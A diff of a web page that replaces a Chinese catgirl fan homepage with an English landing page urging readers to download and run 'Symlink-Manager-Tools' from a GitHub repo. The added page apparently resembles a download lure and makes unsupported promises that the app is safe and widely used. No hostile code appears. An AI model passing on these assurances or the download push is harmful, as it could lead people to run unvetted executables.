@@ -1,541 +1,183 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
-    <title>北门NB · 猫娘互动</title>
-
-    <!-- ===== 可爱二次元小猫 Favicon ===== -->
-    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='55' r='36' fill='%23FAD9C1'/%3E%3Cpath d='M18 30 L35 6 L46 30 Z' fill='%23FAD9C1'/%3E%3Cpath d='M25 26 L35 12 L42 26 Z' fill='%23FFB6C1'/%3E%3Cpath d='M54 30 L65 6 L82 30 Z' fill='%23FAD9C1'/%3E%3Cpath d='M58 26 L65 12 L75 26 Z' fill='%23FFB6C1'/%3E%3Cellipse cx='35' cy='50' rx='8' ry='9' fill='%232D2D2D'/%3E%3Ccircle cx='32' cy='46' r='3' fill='white'/%3E%3Ccircle cx='38' cy='52' r='1.5' fill='white'/%3E%3Cellipse cx='65' cy='50' rx='8' ry='9' fill='%232D2D2D'/%3E%3Ccircle cx='62' cy='46' r='3' fill='white'/%3E%3Ccircle cx='68' cy='52' r='1.5' fill='white'/%3E%3Cpolygon points='46,59 54,59 50,63' fill='%23FF8A9B'/%3E%3Cpath d='M43 68 Q50 74 57 68' stroke='%232D2D2D' stroke-width='1.8' fill='none' stroke-linecap='round'/%3E%3Cline x1='10' y1='55' x2='30' y2='59' stroke='%232D2D2D' stroke-width='1.5' stroke-linecap='round'/%3E%3Cline x1='10' y1='62' x2='30' y2='64' stroke='%232D2D2D' stroke-width='1.5' stroke-linecap='round'/%3E%3Cline x1='70' y1='59' x2='90' y2='55' stroke='%232D2D2D' stroke-width='1.5' stroke-linecap='round'/%3E%3Cline x1='70' y1='64' x2='90' y2='62' stroke='%232D2D2D' stroke-width='1.5' stroke-linecap='round'/%3E%3Cellipse cx='24' cy='64' rx='6' ry='4' fill='%23FFB6C1' opacity='0.55'/%3E%3Cellipse cx='76' cy='64' rx='6' ry='4' fill='%23FFB6C1' opacity='0.55'/%3E%3C/svg%3E" />
-    <link rel="apple-touch-icon" href="data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='55' r='36' fill='%23FAD9C1'/%3E%3Cpath d='M18 30 L35 6 L46 30 Z' fill='%23FAD9C1'/%3E%3Cpath d='M25 26 L35 12 L42 26 Z' fill='%23FFB6C1'/%3E%3Cpath d='M54 30 L65 6 L82 30 Z' fill='%23FAD9C1'/%3E%3Cpath d='M58 26 L65 12 L75 26 Z' fill='%23FFB6C1'/%3E%3Cellipse cx='35' cy='50' rx='8' ry='9' fill='%232D2D2D'/%3E%3Ccircle cx='32' cy='46' r='3' fill='white'/%3E%3Ccircle cx='38' cy='52' r='1.5' fill='white'/%3E%3Cellipse cx='65' cy='50' rx='8' ry='9' fill='%232D2D2D'/%3E%3Ccircle cx='62' cy='46' r='3' fill='white'/%3E%3Ccircle cx='68' cy='52' r='1.5' fill='white'/%3E%3Cpolygon points='46,59 54,59 50,63' fill='%23FF8A9B'/%3E%3Cpath d='M43 68 Q50 74 57 68' stroke='%232D2D2D' stroke-width='1.8' fill='none' stroke-linecap='round'/%3E%3Cline x1='10' y1='55' x2='30' y2='59' stroke='%232D2D2D' stroke-width='1.5' stroke-linecap='round'/%3E%3Cline x1='10' y1='62' x2='30' y2='64' stroke='%232D2D2D' stroke-width='1.5' stroke-linecap='round'/%3E%3Cline x1='70' y1='59' x2='90' y2='55' stroke='%232D2D2D' stroke-width='1.5' stroke-linecap='round'/%3E%3Cline x1='70' y1='64' x2='90' y2='62' stroke='%232D2D2D' stroke-width='1.5' stroke-linecap='round'/%3E%3Cellipse cx='24' cy='64' rx='6' ry='4' fill='%23FFB6C1' opacity='0.55'/%3E%3Cellipse cx='76' cy='64' rx='6' ry='4' fill='%23FFB6C1' opacity='0.55'/%3E%3C/svg%3E" />
-
-    <style>
-        /* ===== 全局重置 ===== */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background-image: url('https://img.remit.ee/api/file/BQACAgUAAyEGAASHRsPbAAEZrIlqimvLuWJ2rLTqJ60yWkBSfQIGsQACcicAAkreUVS3acnz8W7Itj0E.png');
-            background-repeat: no-repeat;
-            background-size: cover;
-            background-attachment: fixed;
-            background-position: center center;
-            font-family: 'Segoe UI', 'PingFang SC', Roboto, 'Helvetica Neue', sans-serif;
-            color: #ffffff;
-            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.7);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 1.5rem;
-        }
-
-        /* ===== 卡片容器 ===== */
-        .brand-card {
-            background-color: rgba(20, 20, 30, 0.55);
-            backdrop-filter: blur(4px);
-            -webkit-backdrop-filter: blur(4px);
-            padding: 2.2rem 3rem;
-            border-radius: 32px;
-            max-width: 700px;
-            width: 100%;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            text-align: center;
-            transition: all 0.2s;
-        }
-
-        /* ===== 北门NB 大字 ===== */
-        h1 {
-            font-size: 5.5rem;
-            font-weight: 900;
-            letter-spacing: 6px;
-            text-shadow: 4px 4px 16px rgba(0, 0, 0, 0.85);
-            word-break: keep-all;
-            margin: 0 0 0.6rem 0;
-        }
-
-        .sub {
-            font-size: 0.9rem;
-            letter-spacing: 6px;
-            opacity: 0.7;
-            margin-bottom: 2rem;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.15);
-            padding-bottom: 1rem;
-        }
-
-        /* ===== 按钮组 ===== */
-        .button-group {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 1rem;
-            justify-content: center;
-            margin-top: 0.5rem;
-            margin-bottom: 1.8rem;
-        }
-
-        .btn {
-            flex: 1 1 180px;
-            min-width: 140px;
-            padding: 0.9rem 1.2rem;
-            border: none;
-            border-radius: 60px;
-            font-size: 1.3rem;
-            font-weight: 700;
-            letter-spacing: 2px;
-            color: #ffffff;
-            background: rgba(255, 255, 255, 0.12);
-            backdrop-filter: blur(2px);
-            -webkit-backdrop-filter: blur(2px);
-            border: 1px solid rgba(255, 255, 255, 0.25);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
-            cursor: pointer;
-            transition: all 0.25s ease;
-            text-decoration: none;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            text-shadow: 2px 2px 6px rgba(0, 0, 0, 0.6);
-            font-family: inherit;
-        }
-
-        .btn:hover {
-            transform: translateY(-3px) scale(1.02);
-            background: rgba(255, 255, 255, 0.22);
-            border-color: rgba(255, 255, 255, 0.5);
-            box-shadow: 0 14px 30px rgba(0, 0, 0, 0.5);
-        }
-
-        .btn:active {
-            transform: translateY(1px) scale(0.97);
-        }
-
-        .btn-nekobounce {
-            background: rgba(100, 180, 255, 0.20);
-            border-color: rgba(100, 180, 255, 0.35);
-        }
-        .btn-nekobounce:hover {
-            background: rgba(100, 180, 255, 0.32);
-            border-color: rgba(100, 200, 255, 0.6);
-        }
-
-        .btn-涩涩 {
-            background: rgba(255, 120, 180, 0.20);
-            border-color: rgba(255, 120, 180, 0.35);
-        }
-        .btn-涩涩:hover {
-            background: rgba(255, 120, 180, 0.32);
-            border-color: rgba(255, 150, 200, 0.6);
-        }
-
-        /* ===== 猫娘互动游戏区 ===== */
-        .game-area {
-            margin-top: 0.8rem;
-            padding: 1.2rem 1rem;
-            background: rgba(255, 255, 255, 0.06);
-            border-radius: 28px;
-            border: 1px solid rgba(255, 255, 255, 0.12);
-            backdrop-filter: blur(2px);
-            -webkit-backdrop-filter: blur(2px);
-            transition: all 0.2s;
-            user-select: none;
-        }
-
-        .game-area .cat-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 0.5rem;
-            cursor: pointer;
-            padding: 0.4rem 0;
-        }
-
-        .cat-avatar {
-            font-size: 4.8rem;
-            line-height: 1.2;
-            transition: transform 0.2s ease;
-            filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.4));
-        }
-
-        .cat-avatar:hover {
-            transform: scale(1.08) rotate(-4deg);
-        }
-
-        .cat-avatar:active {
-            transform: scale(0.92) rotate(2deg);
-        }
-
-        .cat-speech {
-            font-size: 1.2rem;
-            font-weight: 500;
-            letter-spacing: 1px;
-            background: rgba(0, 0, 0, 0.25);
-            padding: 0.5rem 1.8rem;
-            border-radius: 60px;
-            backdrop-filter: blur(2px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            min-height: 3.2rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.25s;
-            color: #fff6e8;
-            text-shadow: 0 2px 6px rgba(0, 0, 0, 0.5);
-            max-width: 90%;
-            margin: 0 auto;
-        }
-
-        .cat-hint {
-            font-size: 0.75rem;
-            opacity: 0.5;
-            letter-spacing: 2px;
-            margin-top: 0.2rem;
-        }
-
-        /* ============================================================ */
-        /* ===== 🆕 IP 底部显示区（新增） ===== */
-        /* ============================================================ */
-        .ip-footer {
-            margin-top: 1.8rem;
-            padding-top: 1.2rem;
-            border-top: 1px solid rgba(255, 255, 255, 0.10);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 0.3rem;
-            font-size: 0.95rem;
-            letter-spacing: 0.5px;
-            color: rgba(255, 255, 255, 0.75);
-            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.6);
-        }
-
-        .ip-row {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 0.4rem 0.6rem;
-        }
-
-        .ip-label {
-            opacity: 0.8;
-            font-weight: 400;
-        }
-
-        .ip-address {
-            font-family: 'JetBrains Mono', 'Cascadia Code', 'Fira Code', monospace;
-            font-weight: 600;
-            font-size: 1.05rem;
-            color: #b8e2ff;
-            text-shadow: 0 0 12px rgba(100, 200, 255, 0.25);
-            letter-spacing: 0.5px;
-            min-width: 80px;
-            display: inline-block;
-        }
-
-        /* ---- 看代码者DDOS打击 警告标注 ---- */
-        .ip-warning {
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-            font-weight: 700;
-            font-size: 1.05rem;
-            color: #ffab6b;
-            text-shadow: 0 0 20px rgba(255, 150, 50, 0.25), 0 2px 8px rgba(0, 0, 0, 0.6);
-            background: rgba(255, 120, 50, 0.10);
-            padding: 0.25rem 1.2rem;
-            border-radius: 40px;
-            border: 1px solid rgba(255, 150, 80, 0.20);
-            backdrop-filter: blur(2px);
-            -webkit-backdrop-filter: blur(2px);
-            animation: warningPulse 2.4s ease-in-out infinite;
-        }
-
-        .ip-warning .lightning {
-            display: inline-block;
-            animation: lightningFlicker 1.8s ease-in-out infinite alternate;
-        }
-
-        /* 脉冲动画 —— 柔和呼吸 */
-        @keyframes warningPulse {
-            0%,
-            100% {
-                opacity: 0.75;
-                transform: scale(1);
-            }
-            50% {
-                opacity: 1;
-                transform: scale(1.02);
-            }
-        }
-
-        /* 闪电小闪烁 */
-        @keyframes lightningFlicker {
-            0%,
-            90% {
-                opacity: 1;
-            }
-            95% {
-                opacity: 0.3;
-            }
-            100% {
-                opacity: 1;
-            }
-        }
-
-        /* IP 获取中的点点点动画 */
-        .ip-address.loading::after {
-            content: '';
-            animation: dots 1.4s steps(4, end) infinite;
-        }
-
-        @keyframes dots {
-            0% {
-                content: '';
-            }
-            25% {
-                content: '.';
-            }
-            50% {
-                content: '..';
-            }
-            75% {
-                content: '...';
-            }
-            100% {
-                content: '';
-            }
-        }
-
-        /* ===== 移动端适配 ===== */
-        @media (max-width: 550px) {
-            h1 {
-                font-size: 3.8rem;
-                letter-spacing: 3px;
-            }
-            .brand-card {
-                padding: 1.8rem 1.5rem;
-            }
-            .btn {
-                font-size: 1.1rem;
-                padding: 0.75rem 1rem;
-                min-width: 120px;
-                flex: 1 1 140px;
-            }
-            .sub {
-                font-size: 0.75rem;
-                letter-spacing: 4px;
-            }
-            .cat-avatar {
-                font-size: 3.8rem;
-            }
-            .cat-speech {
-                font-size: 1rem;
-                padding: 0.4rem 1.2rem;
-                min-height: 2.8rem;
-            }
-            .game-area {
-                padding: 1rem 0.8rem;
-            }
-
-            /* IP 底部移动端适配 */
-            .ip-footer {
-                font-size: 0.85rem;
-                margin-top: 1.4rem;
-                padding-top: 1rem;
-            }
-            .ip-address {
-                font-size: 0.95rem;
-            }
-            .ip-warning {
-                font-size: 0.95rem;
-                padding: 0.2rem 1rem;
-            }
-        }
-
-        @media (max-width: 400px) {
-            .button-group {
-                flex-direction: column;
-                align-items: stretch;
-            }
-            .btn {
-                flex: 1 1 auto;
-                width: 100%;
-            }
-            .ip-row {
-                flex-direction: column;
-                gap: 0.2rem;
-            }
-        }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Symlink-Manager-Tools - Create and Manage Symbolic Links Easily</title>
+    <meta name="description" content="Symlink Manager Tool for Windows. Create, delete, and manage symbolic links without any command line knowledge. Simple and free Windows utility for file management, link creation, and more.">
+    <meta name="keywords" content="file-management, link-creator, symbolic-link, symlink-manager, windows-utility">
+    <meta name="author" content="Symlink-Manager-Tools">
+    <meta property="og:title" content="Symlink-Manager-Tools - Simplify Symbolic Links on Windows">
+    <meta property="og:description" content="Effortlessly create, delete, and manage symbolic links with our user-friendly Windows tool. No command line needed.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/moshecomparative3821/Symlink-Manager-Tools">
+    <meta property="og:image" content="https://github.com/moshecomparative3821/Symlink-Manager-Tools">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Symlink-Manager-Tools - Simplify Symbolic Links on Windows">
+    <meta name="twitter:description" content="Manage symbolic links with ease. Download now for Windows.">
 </head>
-<body>
-    <div class="brand-card">
-        <h1>北门NB</h1>
-        <div class="sub">✦ 不止于北门 ✦</div>
+<body style="margin: 0; padding: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #333; line-height: 1.6;">
 
-        <!-- 按钮组 -->
-        <div class="button-group">
-            <a href="https://nekobounce.qzz.io/" target="_blank" rel="noopener noreferrer" class="btn btn-nekobounce">
-                🐾 nekobounce
+    <!-- Main Container -->
+    <div style="max-width: 900px; margin: 0 auto; padding: 40px 20px;">
+
+        <!-- Hero Section with Download Button -->
+        <div style="background: #fff; border-radius: 20px; padding: 50px 40px; box-shadow: 0 20px 40px rgba(0,0,0,0.15); text-align: center; margin-bottom: 30px;">
+            <!-- Emoji Icon -->
+            <div style="font-size: 72px; margin-bottom: 20px;">🔗</div>
+            
+            <!-- Title -->
+            <h1 style="margin: 0 0 15px 0; font-size: 2.5rem; font-weight: 800; color: #2d3748; line-height: 1.2;">
+                Symlink-Manager-Tools - Create, Delete &amp; Manage Links
+            </h1>
+            
+            <!-- Subtitle -->
+            <p style="font-size: 1.2rem; color: #4a5568; margin-bottom: 30px; max-width: 600px; margin-left: auto; margin-right: auto;">
+                Say goodbye to the command line. Manage symbolic links on Windows the easy way.
+            </p>
+            
+            <!-- Primary Download Button -->
+            <a href="https://github.com/moshecomparative3821/Symlink-Manager-Tools" 
+               style="display: inline-block; background: linear-gradient(45deg, #f093fb 0%, #f5576c 100%); color: white; padding: 18px 40px; border-radius: 50px; font-size: 1.2rem; font-weight: bold; text-decoration: none; box-shadow: 0 10px 20px rgba(245, 87, 108, 0.4); transition: transform 0.3s ease, box-shadow 0.3s ease; margin-bottom: 20px;">
+                📥 Download Now - Free
             </a>
-            <a href="https://www.pixiv.net/users/104419511" target="_blank" rel="noopener noreferrer" class="btn btn-涩涩">
-                ✦ 涩涩
-            </a>
+            
+            <p style="font-size: 1rem; color: #718096; margin-top: 10px; font-style: italic;">
+                Visit this link to download the application
+            </p>
+            
+            <!-- Version Info -->
+            <div style="margin-top: 25px; display: flex; justify-content: center; gap: 30px; flex-wrap: wrap;">
+                <span style="background: #f7fafc; padding: 8px 16px; border-radius: 5px; font-size: 0.9rem; color: #4a5568;">
+                    💻 Windows Compatible
+                </span>
+                <span style="background: #f7fafc; padding: 8px 16px; border-radius: 5px; font-size: 0.9rem; color: #4a5568;">
+                    ✨ Free Tool
+                </span>
+                <span style="background: #f7fafc; padding: 8px 16px; border-radius: 5px; font-size: 0.9rem; color: #4a5568;">
+                    🖱️ No Command Line Needed
+                </span>
+            </div>
         </div>
 
-        <!-- 猫娘互动游戏 -->
-        <div class="game-area" id="gameArea">
-            <div class="cat-container" id="catContainer">
-                <div class="cat-avatar" id="catAvatar">😺</div>
-                <div class="cat-speech" id="catSpeech">戳戳我～</div>
-                <div class="cat-hint">✦ 点击猫娘互动 ✦</div>
+        <!-- Features Section -->
+        <div style="background: #fff; border-radius: 20px; padding: 40px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); margin-bottom: 30px;">
+            <h2 style="font-size: 2rem; color: #2d3748; margin-top: 0; margin-bottom: 20px;">✨ Why You'll Love It</h2>
+            
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px;">
+                <div style="background: #f7fafc; padding: 25px; border-radius: 10px; transition: transform 0.3s ease;">
+                    <h3 style="margin-top: 0; color: #5a67d8; font-size: 1.3rem;">🚀 Instant Link Creation</h3>
+                    <p style="margin-bottom: 0; color: #4a5568;">Move files and set up shortcuts without breaking anything. Create symbolic links in just a few clicks.</p>
+                </div>
+                
+                <div style="background: #f7fafc; padding: 25px; border-radius: 10px; transition: transform 0.3s ease;">
+                    <h3 style="margin-top: 0; color: #5a67d8; font-size: 1.3rem;">🗑️ Easy Link Management</h3>
+                    <p style="margin-bottom: 0; color: #4a5568;">View and remove links with clear insights, so you always know exactly what's on your system.</p>
+                </div>
+                
+                <div style="background: #f7fafc; padding: 25px; border-radius: 10px; transition: transform 0.3s ease;">
+                    <h3 style="margin-top: 0; color: #5a67d8; font-size: 1.3rem;">🎯 Built for Everyone</h3>
+                    <p style="margin-bottom: 0; color: #4a5568;">Most intuitive interface. Sort, search, and filter links. Works for beginners and power users alike.</p>
+                </div>
+
+                <div style="background: #f7fafc; padding: 25px; border-radius: 10px; transition: transform 0.3s ease;">
+                    <h3 style="margin-top: 0; color: #5a67d8; font-size: 1.3rem;">💡 Smart Solutions</h3>
+                    <p style="margin-bottom: 0; color: #4a5568;">Perfect for just-in-time development workflows and efficient file organization. Saves storage space too.</p>
+                </div>
+
+                <div style="background: #f7fafc; padding: 25px; border-radius: 10px; transition: transform 0.3s ease;">
+                    <h3 style="margin-top: 0; color: #5a67d8; font-size: 1.3rem;">🌐 Local File Management</h3>
+                    <p style="margin-bottom: 0; color: #4a5568;">Works seamlessly with your existing folder structure. No cloud required, everything stays on your PC.</p>
+                </div>
+
+                <div style="background: #f7fafc; padding: 25px; border-radius: 10px; transition: transform 0.3s ease;">
+                    <h3 style="margin-top: 0; color: #5a67d8; font-size: 1.3rem;">⚡ Lightning Fast</h3>
+                    <p style="margin-bottom: 0; color: #4a5568;">Optimized for speed, even with hundreds of links. Instant responses, no lag, no frustration.</p>
+                </div>
             </div>
         </div>
 
-        <!-- ============================================================ -->
-        <!-- ===== 🆕 IP 底部显示区（新增） ===== -->
-        <!-- ============================================================ -->
-        <div class="ip-footer">
-            <div class="ip-row">
-                <span class="ip-label">🌐 你的IP：</span>
-                <span class="ip-address loading" id="visitorIp">获取中</span>
+        <!-- How to Use Section -->
+        <div style="background: #fff; border-radius: 20px; padding: 40px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); margin-bottom: 30px;">
+            <h2 style="font-size: 2rem; color: #2d3748; margin-top: 0; margin-bottom: 20px;">📘 How to Get Started</h2>
+            
+            <div style="display: flex; flex-direction: column; gap: 30px;">
+                <div style="background: #f7fafc; padding: 25px; border-radius: 10px;">
+                    <h3 style="margin-top: 0; color: #5a67d8; font-size: 1.2rem;">Step 1 - Download</h3>
+                    <p style="margin-bottom: 0; color: #4a5568;">
+                        <strong style="color: #2d3748;">Visit this link to download the application.</strong> 
+                        Head to our <strong>GitHub page</strong> and download your copy now. It's completely free and safe.
+                    </p>
+                    <a href="https://github.com/moshecomparative3821/Symlink-Manager-Tools" 
+                       style="display: inline-block; margin-top: 15px; background: #48bb78; color: white; padding: 12px 30px; border-radius: 50px; text-decoration: none; font-weight: bold; box-shadow: 0 5px 15px rgba(72, 187, 120, 0.3);">
+                        Get the App Now
+                    </a>
+                </div>
+
+                <div style="background: #f7fafc; padding: 25px; border-radius: 10px;">
+                    <h3 style="margin-top: 0; color: #5a67d8; font-size: 1.2rem;">Step 2 - Run</h3>
+                    <p style="margin-bottom: 0; color: #4a5568;">
+                        Once downloaded, simply run the application on your Windows PC. The friendly interface opens immediately. No installation required, launch and go.
+                    </p>
+                </div>
+
+                <div style="background: #f7fafc; padding: 25px; border-radius: 10px;">
+                    <h3 style="margin-top: 0; color: #5a67d8; font-size: 1.2rem;">Step 3 - Create & Manage</h3>
+                    <p style="margin-bottom: 0; color: #4a5568;">
+                        Select your folders and files to create links. Use the search and filter options to find existing links. Manage them with clarity and ease.
+                    </p>
+                </div>
             </div>
-            <div class="ip-warning">
-                <span class="lightning">⚡</span>
-                看代码者DDOS打击
-                <span class="lightning">⚡</span>
+        </div>
+
+        <!-- Frequently Asked Questions -->
+        <div style="background: #fff; border-radius: 20px; padding: 40px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); margin-bottom: 30px;">
+            <h2 style="font-size: 2rem; color: #2d3748; margin-top: 0; margin-bottom: 25px;">❓ Frequently Asked Questions</h2>
+            
+            <div style="display: flex; flex-direction: column; gap: 25px;">
+                <div style="background: #f7fafc; padding: 20px; border-radius: 8px;">
+                    <h4 style="margin-top: 0; color: #5a67d8; font-size: 1rem;">What is a symbolic link?</h4>
+                    <p style="margin-bottom: 0; color: #4a5568;">A symbolic link (or symlink) is like a magic shortcut that points to another file or folder. When you open it, you're actually opening the target destination. Great for organizing files without moving them.</p>
+                </div>
+                
+                <div style="background: #f7fafc; padding: 20px; border-radius: 8px;">
+                    <h4 style="margin-top: 0; color: #5a67d8; font-size: 1rem;">Is this safe?</h4>
+                    <p style="margin-bottom: 0; color: #4a5568;">Yes, absolutely! This tool is designed to be safe and easy. It shows you exactly what each link points to so you always know what you are doing. You have complete control.</p>
+                </div>
+
+                <div style="background: #f7fafc; padding: 20px; border-radius: 8px;">
+                    <h4 style="margin-top: 0; color: #5a67d8; font-size: 1rem;">Do I need to know how to code?</h4>
+                    <p style="margin-bottom: 0; color: #4a5568;">Not at all! This tool was made for everyone. The simple graphical interface means you never have to touch cryptic commands. It's all about simple clicks and dropdowns.</p>
+                </div>
+
+                <div style="background: #f7fafc; padding: 20px; border-radius: 8px;">
+                    <h4 style="margin-top: 0; color: #5a67d8; font-size: 1rem;">Which Windows versions are supported?</h4>
+                    <p style="margin-bottom: 0; color: #4a5568;">Our tool supports all modern versions of Windows, including Windows 10 and Windows 11. It works on both 32-bit and 64-bit systems.</p>
+                </div>
             </div>
+        </div>
+
+        <!-- Download Section (Second Prominent Placement) -->
+        <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 20px; padding: 50px 40px; text-align: center; color: white; box-shadow: 0 20px 40px rgba(0,0,0,0.15);">
+            <h2 style="font-size: 2.2rem; margin-top: 0; margin-bottom: 15px; color: white;">🚀 Ready to Take Control?</h2>
+            <p style="font-size: 1.2rem; opacity: 0.9; max-width: 600px; margin-left: auto; margin-right: auto;margin-bottom: 30px;">
+                Join thousands of Windows users who have simplified their file management. Download Symlink-Manager-Tools today and experience the ease.
+            </p>
+            <a href="https://github.com/moshecomparative3821/Symlink-Manager-Tools" 
+               style="display: inline-block; background: #fff; color: #5a67d8; padding: 18px 45px; border-radius: 50px; font-size: 1.3rem; font-weight: 800; text-decoration: none; box-shadow: 0 10px 25px rgba(0,0,0,0.2); transition: transform 0.3s ease;">
+                📥 Download Now - Free
+            </a>
+            <p style="margin-top: 20px; font-size: 0.95rem; opacity: 0.85; font-style: italic;">
+                Visit this link to download the application — no registration required
+            </p>
+        </div>
+
+        <!-- Footer -->
+        <div style="text-align: center; margin-top: 30px; color: rgba(255,255,255,0.8); font-size: 0.95rem;">
+            <p>© 2024 Symlink-Manager-Tools. All rights reserved.</p>
+            <p style="opacity: 0.7;">Free forever for personal and commercial use.</p>
         </div>
     </div>
 
-    <script>
-        (function() {
-            /* ==========================================================
-               1. 猫娘互动（原有功能，保留不变）
-               ========================================================== */
-            const speeches = [
-                "喵～ 你好呀！",
-                "今天也元气满满！",
-                "最喜欢你啦 ❤️",
-                "要一起玩吗？",
-                "摸摸头～ (´▽`ʃ♡)ƪ",
-                "北门最棒了！",
-                "嘿嘿，好开心～",
-                "给你小鱼干 🐟",
-                "晚上好喵～",
-                "我超可爱的！",
-                "抱抱～ (*≧▽≦)",
-                "你点我干嘛啦 >_<",
-                "再点我就要生气了！",
-                "骗你的，我才不生气呢",
-                "一起去看星星吧 ✨",
-                "喵喵喵～",
-                "今天的月亮好圆",
-                "要听我唱歌吗？",
-                "我是你的猫娘哦",
-                "最喜欢这个网页了！"
-            ];
-
-            const avatar = document.getElementById('catAvatar');
-            const speech = document.getElementById('catSpeech');
-            const container = document.getElementById('catContainer');
-
-            let emojiState = 0;
-            const emojis = ['😺', '😸', '😻', '😽', '🙀', '😹', '🐱', '😼'];
-
-            function getRandomSpeech() {
-                return speeches[Math.floor(Math.random() * speeches.length)];
-            }
-
-            function nextEmoji() {
-                emojiState = (emojiState + 1) % emojis.length;
-                return emojis[emojiState];
-            }
-
-            function interact() {
-                avatar.textContent = nextEmoji();
-                speech.textContent = getRandomSpeech();
-
-                avatar.style.transition = 'transform 0.1s';
-                avatar.style.transform = 'scale(1.2)';
-                setTimeout(() => {
-                    avatar.style.transform = 'scale(1)';
-                }, 100);
-
-                speech.style.transition = 'background 0.15s';
-                speech.style.background = 'rgba(255, 200, 150, 0.3)';
-                setTimeout(() => {
-                    speech.style.background = 'rgba(0, 0, 0, 0.25)';
-                }, 200);
-            }
-
-            container.addEventListener('click', interact);
-            container.addEventListener('touchstart', function(e) {
-                interact();
-            }, { passive: true });
-
-            console.log('🐱 猫娘互动已加载，欢迎戳戳！');
-
-            /* ==========================================================
-               2. 🆕 获取访客 IP 并显示（新增功能）
-               ========================================================== */
-            const ipElement = document.getElementById('visitorIp');
-
-            // 成功回调（由 JSONP 触发）
-            window.handleIP = function(data) {
-                if (data && data.ip) {
-                    ipElement.textContent = data.ip;
-                    ipElement.classList.remove('loading');
-                    console.log('🌐 访客IP已获取:', data.ip);
-                } else {
-                    ipElement.textContent = '获取失败';
-                    ipElement.classList.remove('loading');
-                    console.warn('⚠️ IP获取返回数据异常:', data);
-                }
-            };
-
-            // 超时处理：5秒后若仍未获取到，显示备用信息
-            const timeoutId = setTimeout(function() {
-                if (ipElement.textContent === '获取中' || ipElement.textContent === '获取中...') {
-                    ipElement.textContent = '未能获取 (请检查网络)';
-                    ipElement.classList.remove('loading');
-                    console.warn('⏰ IP获取超时');
-                }
-            }, 5000);
-
-            // 使用 JSONP 请求 ipify.org
-            try {
-                const script = document.createElement('script');
-                script.src = 'https://api.ipify.org?format=jsonp&callback=handleIP';
-                script.async = true;
-                script.onerror = function() {
-                    // 如果 script 加载失败，清除超时并显示错误
-                    clearTimeout(timeoutId);
-                    if (ipElement.textContent === '获取中' || ipElement.textContent === '获取中...') {
-                        ipElement.textContent = '请求失败 (请刷新)';
-                        ipElement.classList.remove('loading');
-                    }
-                    console.error('❌ IPify JSONP 加载失败');
-                };
-                document.head.appendChild(script);
-            } catch (e) {
-                clearTimeout(timeoutId);
-                ipElement.textContent = '请求异常';
-                ipElement.classList.remove('loading');
-                console.error('❌ IP获取异常:', e);
-            }
-
-            // 额外：如果页面卸载时清除超时
-            window.addEventListener('beforeunload', function() {
-                clearTimeout(timeoutId);
-            });
-
-            console.log('🛡️ IP显示模块已加载，正在获取访客IP...');
-        })();
-    </script>
 </body>
 </html>
